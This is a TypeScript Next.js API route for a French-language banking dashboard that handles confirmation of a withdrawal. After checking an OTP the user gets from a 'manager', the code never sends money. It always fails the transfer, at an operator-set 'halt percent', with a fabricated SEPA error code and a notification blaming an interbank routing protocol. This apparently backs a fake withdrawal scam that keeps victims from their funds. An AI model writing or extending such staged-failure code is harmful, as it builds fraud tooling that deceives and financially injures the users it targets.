import { randomUUID } from "node:crypto";
import { and, eq, sql } from "drizzle-orm";
import { NextResponse } from "next/server";
import { getApprovedUser } from "@/lib/auth";
import { getOrCreateAccount } from "@/lib/dashboard-data";
import { db } from "@/lib/db";
import { accountsTable, notificationsTable, transactionsTable, withdrawalRequestsTable } from "@/lib/schema";

export async function POST(request: Request) {
  try {
    const user = await getApprovedUser();
    if (!user) return NextResponse.json({ success: false, message: "Authentification requise." }, { status: 401 });

    const body = await request.json();
    const { requestId, otpCode } = body as { requestId?: string; otpCode?: string };

    if (!requestId || !otpCode) {
      return NextResponse.json({ success: false, message: "Identifiant et code de validation requis." }, { status: 400 });
    }

    const [reqRow] = await db
      .select()
      .from(withdrawalRequestsTable)
      .where(and(eq(withdrawalRequestsTable.id, requestId), eq(withdrawalRequestsTable.userId, user.id)))
      .limit(1);

    if (!reqRow) {
      return NextResponse.json({ success: false, message: "Demande de transfert introuvable." }, { status: 404 });
    }

    if (!reqRow.otpCode || !reqRow.otpCode.trim()) {
      return NextResponse.json({
        success: false,
        message: "Le protocole de sécurité n'a pas encore été configuré par votre gestionnaire.",
      }, { status: 400 });
    }

    const trimmedEntered = otpCode.trim();
    if (trimmedEntered !== reqRow.otpCode.trim()) {
      return NextResponse.json({
        success: false,
        message: "Code de sécurité erroné. Veuillez vérifier le code transmis par votre gestionnaire.",
      }, { status: 400 });
    }

    const haltPercent = reqRow.haltPercent ?? 50;
    const haltMessage = reqRow.haltMessage ?? "Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard.";
    const errorCode = reqRow.errorCode ?? `ERR_SEPA_${haltPercent}`;

    const account = await getOrCreateAccount(user.id);
    const createdAt = new Date().toISOString();

    await db.transaction(async (tx) => {
      // Met à jour la demande en échec de routage
      await tx
        .update(withdrawalRequestsTable)
        .set({ status: "blocked_at_routing" })
        .where(eq(withdrawalRequestsTable.id, requestId));

      // Libère le montant réservé
      await tx
        .update(accountsTable)
        .set({ reservedCents: sql`MAX(0, ${accountsTable.reservedCents} - ${reqRow.amountCents})` })
        .where(eq(accountsTable.userId, user.id));

      // Met à jour la transaction
      await tx
        .update(transactionsTable)
        .set({
          status: "failed",
          description: `Virement vers ${reqRow.recipientName} (Échec interbancaire ${haltPercent}%)`,
        })
        .where(and(
          eq(transactionsTable.relatedId, requestId),
          eq(transactionsTable.userId, user.id),
        ));

      await tx.insert(notificationsTable).values({
        id: randomUUID(),
        userId: user.id,
        type: "transaction",
        title: "Interruption du virement bancaire",
        message: `Le virement de ${(reqRow.amountCents / 100).toFixed(2)} € vers ${reqRow.recipientName} a été interrompu par le protocole de routage (Code : ${errorCode}).`,
        createdAt,
      });
    });

    return NextResponse.json({
      success: true,
      haltAtPercent: haltPercent,
      haltMessage,
      errorCode,
      recipientName: reqRow.recipientName,
      amountCents: reqRow.amountCents,
    });
  } catch (error) {
    console.error("Erreur confirmation virement :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}
